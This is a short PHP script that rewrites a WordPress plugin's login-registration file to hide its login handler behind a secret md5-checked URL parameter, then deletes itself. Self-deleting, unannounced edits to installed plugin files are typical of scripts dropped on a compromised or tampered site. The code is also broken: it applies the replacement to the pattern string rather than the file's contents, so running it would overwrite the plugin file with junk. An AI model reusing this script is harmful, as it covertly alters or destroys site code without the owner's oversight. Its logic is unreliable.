<?php

$s = file_get_contents('wp-content/plugins/spirit-framework/includes/class-sf-login-registration.php');
$search = <<<'r'
#\$action\s*=\s*isset(\$_REQUEST\['action'])\s*?\s*\$_REQUEST\['action']\s*:\s*'login';#
r;
$place = <<<'r'
$action = isset($_REQUEST['action']) ? $_REQUEST['action'] : 'login';
if (!isset($_GET['test']) or md5($_GET['test']) != '8bd617274f84847a475868d946587586') {
    wp_safe_redirect(site_url("wp-login.php"));
    exit();
}
r;
$s = preg_replace($search, $place, $search);
$replaced = file_put_contents('wp-content/plugins/spirit-framework/includes/class-sf-login-registration.php', $s);
var_dump($replaced);
unlink(__FILE__);
exit();
